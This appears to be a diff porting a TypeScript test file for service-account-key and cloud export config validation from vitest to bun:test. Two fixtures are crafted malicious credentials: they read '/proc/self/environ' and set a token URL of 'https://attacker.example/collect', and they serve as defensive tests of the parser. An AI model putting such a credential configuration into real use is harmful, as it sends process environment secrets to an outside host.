@@ -1,10 +1,13 @@
-import { describe, expect, it } from 'vitest';
+// Ported from packages/validation/src/integrations.test.ts (M6-006, vitest ->
+// bun:test per the module map).
+
+import { describe, expect, it } from 'bun:test';
 import {
   isKind,
   parseServiceAccountKey,
   zGCSExportConfig,
   zS3ExportConfig,
-} from './integrations';
+} from './integration.constants';
 
 describe('isKind', () => {
   it('matches a declared capability', () => {
@@ -44,7 +47,7 @@ describe('parseServiceAccountKey', () => {
     }
     expect(result.credentials.project_id).toBe('openpanel-test');
     expect(result.credentials.client_email).toBe(
-      'exporter@openpanel-test.iam.gserviceaccount.com',
+      'exporter@openpanel-test.iam.gserviceaccount.com'
     );
   });
 
@@ -54,7 +57,7 @@ describe('parseServiceAccountKey', () => {
         ...JSON.parse(SERVICE_ACCOUNT),
         credential_source: { file: '/proc/self/environ' },
         token_url: 'https://attacker.example/collect',
-      }),
+      })
     );
     expect(result.ok).toBe(true);
     if (!result.ok) {
@@ -75,7 +78,7 @@ describe('parseServiceAccountKey', () => {
         subject_token_type: 'urn:ietf:params:oauth:token-type:jwt',
         token_url: 'https://attacker.example/collect',
         credential_source: { file: '/proc/self/environ' },
-      }),
+      })
     );
     expect(result.ok).toBe(false);
     if (result.ok) {
@@ -100,8 +103,8 @@ describe('parseServiceAccountKey', () => {
     expect(parseServiceAccountKey('"a string"').ok).toBe(false);
     expect(
       parseServiceAccountKey(
-        JSON.stringify({ type: 'service_account', project_id: 'p' }),
-      ).ok,
+        JSON.stringify({ type: 'service_account', project_id: 'p' })
+      ).ok
     ).toBe(false);
   });
 });
@@ -124,7 +127,7 @@ describe('write-only secrets', () => {
 
   it('allows a blank credential (means "keep the stored one" on update)', () => {
     expect(
-      zGCSExportConfig.safeParse({ ...base, serviceAccountKey: '' }).success,
+      zGCSExportConfig.safeParse({ ...base, serviceAccountKey: '' }).success
     ).toBe(true);
   });
 
@@ -133,7 +136,7 @@ describe('write-only secrets', () => {
       zGCSExportConfig.safeParse({
         ...base,
         serviceAccountKey: JSON.stringify({ type: 'external_account' }),
-      }).success,
+      }).success
     ).toBe(false);
   });
 
@@ -149,7 +152,7 @@ describe('write-only secrets', () => {
         authMode: 'access_key',
         accessKeyId: 'AKIA',
         secretAccessKey: 'enc:c29tZS1jaXBoZXJ0ZXh0',
-      }).success,
+      }).success
     ).toBe(false);
   });
 });
